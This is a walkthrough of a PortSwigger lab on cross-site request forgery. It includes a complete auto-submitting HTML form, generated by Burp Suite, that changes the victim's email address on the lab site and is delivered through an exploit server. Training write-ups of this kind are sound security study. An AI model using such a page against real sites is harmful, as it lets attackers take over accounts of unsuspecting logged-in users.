[Source](https://portswigger.net/web-security/csrf/lab-no-defenses)
## Task
The email address change functionality in this lab is vulnerable to CSRF.
To solve the task, we need to create HTML code that changes the email address of the user viewing the page using a CSRF attack and upload this code to our exploit server.
We can log in to our account using the following credentials: `wiener:peter`.
## Solution
Go to the task site

![image](images/20241223105903.png)

Log in to your account

![image](images/20241223110025.png)


![image](images/20241223110043.png)

Enter the email you want to change to and intercept the request in `Burp Suite`. Then right-click > Engagement tools > Generate CSRF PoC`. Click `Copy HTML`.

![image](images/20241223110353.png)


![image](images/20241223110637.png)

After that, go to the site, click the `Go to exploit server` button and paste the vulnerable HTML code into `Body`. Click `Store`
```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8e00cf04a2eee5bf12e0fe00ba0074.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="mailforspamwork&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](images/20241223110954.png)

Let's check if the exploit works. To do this, click the `View exploit` button and intercept the request in `Burp Suite`.

![image](images/20241223111113.png)

Then click `Deliver exploit to victim` and the problem is solved

![image](images/20241223122937.png)
